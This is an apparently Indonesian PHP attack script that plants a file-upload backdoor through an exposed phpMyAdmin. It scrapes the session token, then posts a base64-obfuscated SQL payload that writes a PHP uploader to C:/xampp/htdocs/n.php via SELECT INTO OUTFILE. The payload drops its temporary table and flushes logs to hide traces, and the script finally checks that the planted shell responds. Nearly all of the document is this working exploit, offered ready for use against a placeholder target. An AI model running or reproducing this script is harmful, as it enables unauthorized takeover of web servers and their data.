<?php
//Tu5b0l3d
//Auto upload uploader in phpmyadmin
cover();
$site = "Ini_Target";
$sql = "phpmyadmin/import.php";
$sql2 = "phpmyadmin/server_sql.php";
$file = "n.php";

function anuu($url, $dir){
 $ch1 = curl_init("$url/$dir");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
}

function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function cover(){
	echo "\n\n\t############# D3C #############\n";
	echo "\t#########  Thx To: HNc, IBT ,IndoXploit  #########\n\n";
}


function upload22($urlq, $path, $toket, $shell){
		$post = array(
					"is_js_confirmed" => "0",
					"token" => "$toket",
					"pos" => "0",
					"goto" => "server_sql.php",
					"zero_rows" => "Your SQL query has been executed successfully",
					"sql_query" => "$shell",
					"bkm_label" => "",
					"bkm_all_users" => "",
					"bkm_replace" => "true",
					"sql_delimiter" => ";",
					"show_query" => "1",
					"SQL" => "Go",
					);
$ch = curl_init ("$urlq/$path");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
}


$toket = anuu($site, $sql2);
$toket_asli = ambilkata($toket,"name=\"token\" value=\"","\" />");


$shell = base64_decode("dXNlIG15c3FsOw0KRFJPUCBUQUJMRSBJRiBFWElTVFMgYHRlbXB0YWJgOw0KQ1JFQVRFIFRBQkxFIHRlbXB0YWIgKGNvZGV0YWIgdGV4dCk7DQpJTlNFUlQgSU5UTyB0ZW1wdGFiIChjb2RldGFiKSBWQUxVRVMgKA0KJzx0aXRsZT5VcGxvYWQgRmlsZTwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KYm9keSx0ZCx0aCB7DQpjb2xvcjogIzBGMDsNCn0NCmJvZHkgew0KYmFja2dyb3VuZC1jb2xvcjogIzk5OTsNCn0NCi0tPg0KPC9zdHlsZT48cD5nYW50ZW5nDQo8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiA+DQo8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgLz4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiIC8+DQo8L2Zvcm0+DQo8cD4NCjxzdHJvbmc+DQo8P3BocA0KaWYgKCRfRklMRVNbImZpbGUiXSAhPSAiIikgew0KY29weSgkX0ZJTEVTWyJmaWxlIl1bInRtcF9uYW1lIl0sICRfRklMRVNbImZpbGUiXVsibmFtZSJdKSBvciBkaWUgKCJQcm9zZXMgdXBsb2FkIEdhZ2FsOiAiKTsNCn1lbHNlIHsNCmRpZSgiU2lsYWhrYW4gcGlsaWggZmlsZSIpOw0KfQ0KPz4NCkZpbGUgYmVyaGFzaWwgZGl1cGxvYWQ6PGJyIC8+DQpLZXRlcmFuZ2FuIEZpbGU6PGJyIC8+DQpOYW1hIEZpbGU6IDw/cGhwIGVjaG8gJF9GSUxFU1siZmlsZSJdWyJuYW1lIl07ID8+PGJyIC8+DQpVa3VyYW4gRmlsZTogPD9waHAgZWNobyAkX0ZJTEVTWyJmaWxlIl1bInNpemUiXTs/PiBCeXRlcyA8YnIgLz4NCkplbmlzIEZpbGU6IDw/cGhwIGVjaG8gJF9GSUxFU1siZmlsZSJdWyJ0eXBlIl07ID8+PC9zdHJvbmc+PC9wPg0KDQonDQopOw0KU0VMRUNUICogSU5UTyBPVVRGSUxFICdDOi94YW1wcC9odGRvY3Mvbi5waHAnIGZyb20gdGVtcHRhYjsNCkRST1AgVEFCTEUgdGVtcHRhYjsNCkZMVVNIIExPR1M7DQo=");
$upload = upload22($site, $sql, $toket_asli, $shell);
$files = anuu($site, $file);
if(preg_match("#ganteng#i",$files)){
	echo "# Berhasil Nanem Uploader\n$site/$file\n\n";
}
else{
	echo "# Gagal~\n";
}



?>
